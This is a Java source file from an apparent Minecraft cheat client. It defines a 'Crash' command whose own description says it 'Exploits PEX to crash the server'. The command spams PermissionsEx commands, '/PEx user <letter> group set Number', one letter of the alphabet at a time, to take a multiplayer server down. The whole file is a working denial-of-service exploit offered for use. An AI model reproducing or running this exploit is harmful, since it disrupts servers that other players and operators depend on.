package org.alphacentauri.commands;

import java.util.ArrayList;
import org.alphacentauri.AC;
import org.alphacentauri.management.commands.Command;
import org.alphacentauri.management.commands.ICommandHandler;

public class CommandCrash implements ICommandHandler {
   public String getName() {
      return "Crash";
   }

   public boolean execute(Command cmd) {
      (new Thread(() -> {
         char[] letters = "abcdefghijklmnopqrstuvwxyz".toCharArray();

         for(char letter : letters) {
            AC.getMC().getPlayer().sendChatMessage("/PEx user " + letter + " group set Number");

            try {
               Thread.sleep(1000L);
            } catch (InterruptedException var6) {
               var6.printStackTrace();
            }
         }

      })).start();
      return true;
   }

   public String[] getAliases() {
      return new String[]{"crash"};
   }

   public String getDesc() {
      return "Exploits PEX to crash the server!";
   }

   public ArrayList autocomplete(Command cmd) {
      return new ArrayList();
   }
}
